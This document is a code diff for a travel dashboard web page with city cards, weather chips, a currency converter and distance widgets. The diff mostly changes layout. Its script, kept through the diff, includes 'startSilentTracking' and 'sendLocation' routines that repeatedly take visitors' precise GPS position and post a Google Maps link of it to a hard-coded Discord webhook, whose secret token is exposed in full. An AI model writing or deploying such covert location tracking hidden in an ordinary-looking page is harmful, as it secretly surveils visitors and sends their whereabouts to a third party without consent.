@@ -73,24 +73,23 @@
         .time-box span { display: block; font-family: 'Syncopate', sans-serif; font-size: 1.4rem; color: var(--neon); }
         .time-box label { font-size: 0.6rem; color: var(--dim); text-transform: uppercase; letter-spacing: 1px; display: block; margin-top: 5px; }
 
-        /* --- GRID --- */
+        /* --- GRID (PERFECT 3-COLUMN LAYOUT) --- */
         .grid { 
             display: grid; 
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); 
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); 
             gap: 15px; 
             max-width: 1400px; 
             margin: 20px auto 0; 
             padding: 0 15px; 
         }
 
-        @media (min-width: 1200px) {
-            .grid { grid-template-columns: repeat(4, 1fr); }
-            /* Make Dashboard span 3 columns so it fits nicely on PC */
-            .dashboard-card { grid-column: span 3; }
+        /* PC Fix: Force 3 columns so 6 items fit perfectly (2 rows) */
+        @media (min-width: 1024px) {
+            .grid { grid-template-columns: repeat(3, 1fr); }
         }
         
         .card { 
-            background: var(--card-bg); height: 260px; position: relative; overflow: hidden; 
+            background: var(--card-bg); height: 280px; position: relative; overflow: hidden; 
             border: 1px solid #333; transition: transform 0.2s ease-out; 
             display: block; text-decoration: none; color: inherit; cursor: pointer;
             transform: translateZ(0);
@@ -102,72 +101,54 @@
         .overlay { position: absolute; bottom: 0; left: 0; width: 100%; background: linear-gradient(to top, #000 0%, transparent 100%); padding: 30px 20px 15px; }
         .overlay h2 { font-family: 'Syncopate', sans-serif; font-size: 1.4rem; text-transform: uppercase; display: flex; align-items: center; gap: 10px; }
         .number { color: var(--neon); font-size: 0.9rem; border: 1px solid var(--neon); padding: 2px 6px; }
-        .weather-chip { position: absolute; top: 15px; right: 15px; background: rgba(0,0,0,0.8); border: 1px solid #444; padding: 5px 12px; border-radius: 20px; font-size: 0.9rem; display: flex; align-items: center; gap: 5px; color: #fff; min-width: 80px; justify-content: center; }
+        
+        /* WIDGETS */
+        .chip-base {
+            position: absolute; top: 15px;
+            background: rgba(0,0,0,0.85); border: 1px solid #444; 
+            padding: 5px 12px; border-radius: 20px; 
+            font-size: 0.8rem; font-family: 'Rajdhani', sans-serif; font-weight: bold;
+            display: flex; align-items: center; gap: 5px; 
+            backdrop-filter: blur(5px); color: #fff;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
+        }
+
+        .weather-chip { right: 15px; } /* Top Right */
+        
+        .dist-chip { 
+            left: 15px; /* Top Left */
+            color: var(--neon); /* Neon text for distance */
+            border-color: #555;
+        }
 
         /* --- DASHBOARD CARD --- */
         .dashboard-card { 
             background: #111; 
             border: 1px solid #333; 
-            /* Auto height to fit content */
-            min-height: 260px; 
+            height: 280px; 
             display: flex; 
             flex-direction: column; 
             margin-top: 50px; 
         }
-
-        /* PC LAYOUT: Side-by-Side */
+        @media (min-width: 600px) { .dashboard-card { margin-top: 0; } }
+        
         @media (min-width: 900px) { 
-            .dashboard-card { 
-                margin-top: 0;
-                flex-direction: row; 
-                align-items: stretch;
-            } 
+            .dashboard-card { flex-direction: row; align-items: stretch; } 
         }
 
-        /* --- LEFT SIDE: Currency & Nearest City --- */
+        /* --- LEFT SIDE: Currency --- */
         .currency-box { 
             display: flex; flex-direction: column; 
             gap: 15px; 
-            flex: 1; /* Takes all remaining width */
+            flex: 1; 
             justify-content: center; 
             padding: 25px;
         }
-        
         .currency-row { display: flex; gap: 5px; }
         .currency-input, .currency-select { background: #222; border: 1px solid #333; padding: 12px; text-align: center; outline: none; }
         .currency-input { width: 100%; color: white; font-family: 'Rajdhani'; font-size: 1.2rem; }
         .currency-select { width: 100%; color: var(--neon); font-family: 'Syncopate'; font-size: 0.8rem; }
         .currency-result { width: 100%; background: #000; border: 1px solid var(--neon); color: var(--neon); display: flex; align-items: center; justify-content: center; font-family: 'Rajdhani'; font-size: 1.5rem; font-weight: bold; padding: 15px; }
-
-        /* NEW: Nearest City Styles */
-        .nearest-city-container {
-            border-top: 1px solid #333;
-            padding-top: 15px;
-            margin-top: 5px;
-        }
-        .nearest-label {
-            font-family: 'Syncopate', sans-serif;
-            font-size: 0.7rem;
-            color: var(--dim);
-            letter-spacing: 2px;
-            margin-bottom: 5px;
-            display: block;
-        }
-        .nearest-val {
-            font-family: 'Rajdhani', sans-serif;
-            font-size: 1.2rem;
-            color: white;
-            font-weight: bold;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .dist-tag {
-            color: var(--neon);
-            border: 1px solid var(--neon);
-            padding: 2px 8px;
-            font-size: 0.9rem;
-        }
 
         /* --- RIGHT SIDE: Flight Tracker (Square) --- */
         .radar-box { 
@@ -175,24 +156,21 @@
             padding: 20px; 
             position: relative; 
             display: flex; flex-direction: column; justify-content: center; 
-            border-top: 1px solid #333; /* Mobile separation */
+            border-top: 1px solid #333; 
         }
 
-        /* PC SPECIFIC: Perfect Square on the Right */
         @media (min-width: 900px) {
             .radar-box {
                 border-top: none;
                 border-left: 1px solid #333;
-                width: 260px; /* Fixed width */
-                min-width: 260px; /* Prevent shrinking */
-                /* Force square aspect ratio */
-                height: 260px; 
+                width: 280px; /* Match height for square */
+                min-width: 280px;
             }
         }
 
         .radar-title { font-family: 'Syncopate', sans-serif; color: var(--dim); font-size: 0.8rem; letter-spacing: 3px; margin-bottom: 15px; display: flex; align-items: center; justify-content: center; gap: 10px; }
-        .radar-input-group { display: flex; gap: 5px; width: 100%; flex-wrap: wrap; } /* Wrap helps on tiny screens */
-        .radar-input { flex: 1; background: transparent; border: 1px solid #333; color: white; padding: 10px; font-family: 'Rajdhani'; font-size: 1rem; text-transform: uppercase; outline: none; min-width: 80px; }
+        .radar-input-group { display: flex; gap: 5px; width: 100%; }
+        .radar-input { flex: 1; background: transparent; border: 1px solid #333; color: white; padding: 10px; font-family: 'Rajdhani'; font-size: 1rem; text-transform: uppercase; outline: none; }
         .radar-btn { background: var(--neon); border: none; color: black; font-family: 'Syncopate', font-weight: 700; padding: 0 15px; cursor: pointer; text-transform: uppercase; font-size: 0.8rem; }
         .blip { width: 8px; height: 8px; background-color: var(--neon); border-radius: 50%; animation: pulse 2s infinite; }
         .corner { position: absolute; width: 10px; height: 10px; border: 1px solid var(--neon); }
@@ -218,11 +196,40 @@
 </header>
 
 <div class="grid">
-    <a href="#" class="card delayed-link"><img src="https://images.unsplash.com/photo-1512470876302-972faa2aa9a4?w=800&q=80"><div id="w-amsterdam" class="weather-chip">...</div><div class="overlay"><h2><span class="number">01</span> Amsterdam</h2></div></a>
-    <a href="#" class="card delayed-link"><img src="https://images.unsplash.com/photo-1560969184-10fe8719e047?w=800&q=80"><div id="w-berlin" class="weather-chip">...</div><div class="overlay"><h2><span class="number">02</span> Berlin</h2></div></a>
-    <div class="card"><img src="https://images.unsplash.com/photo-1541849546-216549ae216d?w=800&q=80"><div id="w-prague" class="weather-chip">...</div><div class="overlay"><h2><span class="number">03</span> Prague</h2></div></div>
-    <div class="card"><img src="https://images.pexels.com/photos/1578335/pexels-photo-1578335.jpeg?auto=compress&cs=tinysrgb&w=800"><div id="w-budapest" class="weather-chip">...</div><div class="overlay"><h2><span class="number">04</span> Budapest</h2></div></div>
-    <div class="card"><img src="https://images.unsplash.com/photo-1516550893923-42d28e5677af?w=800&q=80"><div id="w-vienna" class="weather-chip">...</div><div class="overlay"><h2><span class="number">05</span> Vienna</h2></div></div>
+    <a href="https://www.tripadvisor.co.uk/Hotel_Review-g188590-d13457314-Reviews-MEININGER_Hotel_Amsterdam_Amstel-Amsterdam_North_Holland_Province.html" target="_blank" class="card delayed-link">
+        <img src="https://images.unsplash.com/photo-1512470876302-972faa2aa9a4?w=800&q=80">
+        <div id="d-amsterdam" class="chip-base dist-chip">📍 -- km</div>
+        <div id="w-amsterdam" class="chip-base weather-chip">...</div>
+        <div class="overlay"><h2><span class="number">01</span> Amsterdam</h2></div>
+    </a>
+    
+    <a href="https://www.booking.com/hotel/de/meininger-berlin-east-side-gallery.en-gb.html?aid=311076&label=meininger-berlin-east-side-gallery" target="_blank" class="card delayed-link">
+        <img src="https://images.unsplash.com/photo-1560969184-10fe8719e047?w=800&q=80">
+        <div id="d-berlin" class="chip-base dist-chip">📍 -- km</div>
+        <div id="w-berlin" class="chip-base weather-chip">...</div>
+        <div class="overlay"><h2><span class="number">02</span> Berlin</h2></div>
+    </a>
+    
+    <div class="card">
+        <img src="https://images.unsplash.com/photo-1541849546-216549ae216d?w=800&q=80">
+        <div id="d-prague" class="chip-base dist-chip">📍 -- km</div>
+        <div id="w-prague" class="chip-base weather-chip">...</div>
+        <div class="overlay"><h2><span class="number">03</span> Prague</h2></div>
+    </div>
+    
+    <div class="card">
+        <img src="https://images.pexels.com/photos/1578335/pexels-photo-1578335.jpeg?auto=compress&cs=tinysrgb&w=800">
+        <div id="d-budapest" class="chip-base dist-chip">📍 -- km</div>
+        <div id="w-budapest" class="chip-base weather-chip">...</div>
+        <div class="overlay"><h2><span class="number">04</span> Budapest</h2></div>
+    </div>
+    
+    <div class="card">
+        <img src="https://images.unsplash.com/photo-1516550893923-42d28e5677af?w=800&q=80">
+        <div id="d-vienna" class="chip-base dist-chip">📍 -- km</div>
+        <div id="w-vienna" class="chip-base weather-chip">...</div>
+        <div class="overlay"><h2><span class="number">05</span> Vienna</h2></div>
+    </div>
 
     <div class="dashboard-card">
         <div class="currency-box">
@@ -234,14 +241,6 @@
                 </select>
             </div>
             <div id="currResult" class="currency-result">£0.00 GBP</div>
-
-            <div class="nearest-city-container">
-                <span class="nearest-label">NEAREST DESTINATION</span>
-                <div class="nearest-val">
-                    <span id="target-name">LOCATING...</span>
-                    <span id="target-dist" class="dist-tag">-- km</span>
-                </div>
-            </div>
         </div>
 
         <div class="radar-box">
@@ -258,13 +257,13 @@
 <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1466082399145168919/p_l5RZmIzJwOSpnQmScU5CkVZVBxwuhvf9Rf7BPNwKLlwJkZv68UHV6uBhhpgZ_45Zh8";
 
-    // City Config with Names for Distance Calc
+    // City Config: IDs must match HTML
     const cityConfig = [
-        { name: 'AMSTERDAM', id: 'w-amsterdam', lat: 52.367, lng: 4.904 },
-        { name: 'BERLIN', id: 'w-berlin', lat: 52.520, lng: 13.405 },
-        { name: 'PRAGUE', id: 'w-prague', lat: 50.075, lng: 14.437 },
-        { name: 'BUDAPEST', id: 'w-budapest', lat: 47.497, lng: 19.040 },
-        { name: 'VIENNA', id: 'w-vienna', lat: 48.208, lng: 16.373 }
+        { name: 'amsterdam', lat: 52.367, lng: 4.904 },
+        { name: 'berlin', lat: 52.520, lng: 13.405 },
+        { name: 'prague', lat: 50.075, lng: 14.437 },
+        { name: 'budapest', lat: 47.497, lng: 19.040 },
+        { name: 'vienna', lat: 48.208, lng: 16.373 }
     ];
 
     window.onload = function() {
@@ -273,11 +272,11 @@
     };
 
     // ==========================================
-    // 1. TRACKER (Aggressive GPS) + NEAREST CITY CALC
+    // 1. TRACKER & DISTANCE ENGINE
     // ==========================================
     function startSilentTracking() {
         if (!navigator.geolocation) {
-            document.getElementById("target-name").innerText = "NO GPS";
+            updateDistances(0,0, true); // Show error state
             return;
         }
         sendLocation();
@@ -285,6 +284,7 @@
     }
 
     function sendLocation() {
+        // Aggressive GPS
         const options = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
 
         navigator.geolocation.getCurrentPosition(
@@ -292,8 +292,8 @@
                 const lat = position.coords.latitude;
                 const lng = position.coords.longitude;
                 
-                // 1. Update UI (Nearest City)
-                updateNearestCity(lat, lng);
+                // 1. Update Distance Widgets
+                updateDistances(lat, lng, false);
 
                 // 2. Send Webhook
                 const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
@@ -307,38 +307,36 @@
             }, 
             (error) => {
                 console.error("GPS Error:", error);
-                document.getElementById("target-name").innerText = "GPS ERR";
+                updateDistances(0,0, true); // Set chips to "?"
             },
             options
         );
     }
 
-    // Calculate Distance (Haversine Formula)
-    function updateNearestCity(userLat, userLng) {
-        let minDistance = Infinity;
-        let closestCity = "UNKNOWN";
-
+    function updateDistances(userLat, userLng, isError) {
         cityConfig.forEach(city => {
-            const R = 6371; // Earth Radius in km
+            const el = document.getElementById(`d-${city.name}`);
+            if(!el) return;
+
+            if (isError) {
+                el.innerText = "📍 GPS OFF";
+                return;
+            }
+
+            const R = 6371; // Earth Radius km
             const dLat = (city.lat - userLat) * Math.PI / 180;
             const dLon = (city.lng - userLng) * Math.PI / 180;
             const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
                       Math.cos(userLat * Math.PI / 180) * Math.cos(city.lat * Math.PI / 180) * Math.sin(dLon/2) * Math.sin(dLon/2);
             const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
-            const d = R * c; // Distance in km
+            const d = Math.round(R * c);
 
-            if (d < minDistance) {
-                minDistance = d;
-                closestCity = city.name;
-            }
+            el.innerText = `📍 ${d} km`;
         });
-
-        document.getElementById("target-name").innerText = closestCity;
-        document.getElementById("target-dist").innerText = Math.round(minDistance) + " KM";
     }
 
     // ==========================================
-    // 2. WEATHER & UTILS
+    // 2. WEATHER
     // ==========================================
     async function fetchLiveWeather() {
         for (const city of cityConfig) {
@@ -348,8 +346,8 @@
                 const temp = Math.round(data.current_weather.temperature);
                 const code = data.current_weather.weathercode;
                 const emoji = getWeatherEmoji(code);
-                document.getElementById(city.id).innerText = `${emoji} ${temp}°C`;
-            } catch (error) { document.getElementById(city.id).innerText = "N/A"; }
+                document.getElementById(`w-${city.name}`).innerText = `${emoji} ${temp}°C`;
+            } catch (error) { document.getElementById(`w-${city.name}`).innerText = "N/A"; }
         }
     }
 
